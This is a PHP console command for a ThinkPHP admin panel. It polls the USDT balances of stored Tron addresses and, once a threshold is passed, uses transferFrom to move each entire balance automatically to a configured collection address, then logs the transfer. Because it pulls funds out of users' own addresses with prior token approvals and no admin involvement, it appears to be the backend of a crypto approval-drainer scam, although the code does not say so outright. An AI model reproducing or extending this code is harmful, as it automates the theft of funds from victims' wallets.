<?php
namespace app\admin\command;

use app\common\library\TronService;
use app\admin\model\Ausers;
use think\Config;
use think\console\Command;
use think\console\Input;
use think\console\Output;

class TronMonitor extends Command
{
    protected function configure()
    {
        $this->setName('tron:monitor')->setDescription('Monitor USDT balances and auto collect');
    }

    protected function execute(Input $input, Output $output)
    {
        $tron = new TronService();
        $thresholdUsdt = (int)Config::get('tron.max_usdt_balance');
        $thresholdUsdt *= 1000000;
        $list = Ausers::where('show',0)->select();
        foreach ($list as $item) {
            $addr = $item['address'];
            if (!$addr) {
                continue;
            }
            try {
                $balance = $tron->usdtBalanceOf($addr);
                $usdt = $balance / 1000000;
                $item->save([
                    'usdt_balance' => $balance
                ]);
                $output->writeln($addr . ' ' . $usdt);
                $to = Config::get('tron.max_collect_to');
                if ($balance >= $thresholdUsdt) {
                    $resp = $tron->transferUsdtFrom($addr, $to, $balance);
                    $output->writeln(json_encode($resp, JSON_UNESCAPED_UNICODE));
                    if (isset($resp['result']) && $resp['result'] === true) {
                        if (array_key_exists('state', $item->getData())) {
                            $item->save(['state' => 2,'usdt_balance'=>0]);
                        }
                        Db::name('transfer_log')->insert([
                            'user_id' => $item['id'],
                            'admin_id' => 0,
                            'from_address' => $addr,
                            'to_address' => $to,
                            'percent' => 100,
                            'amount_sun' => $balance,
                            'amount_human' => bcdiv((string)$balance, bcpow("10", (string)6, 0), 6),
                            'decimals' => 6,
                            'tx_id' => $resp['txid'],
                            'result_json' => json_encode($resp, JSON_UNESCAPED_UNICODE),
                            'status' => (isset($resp['result']) && $resp['result'] === true) ? 1 : 0,
                            'createtime' => time(),
                            'updatetime' => time()
                        ]);
                    }
                }
            } catch (\Throwable $e) {
                $output->writeln($addr . ' ' . $e->getMessage());
            }
        }
    }
}
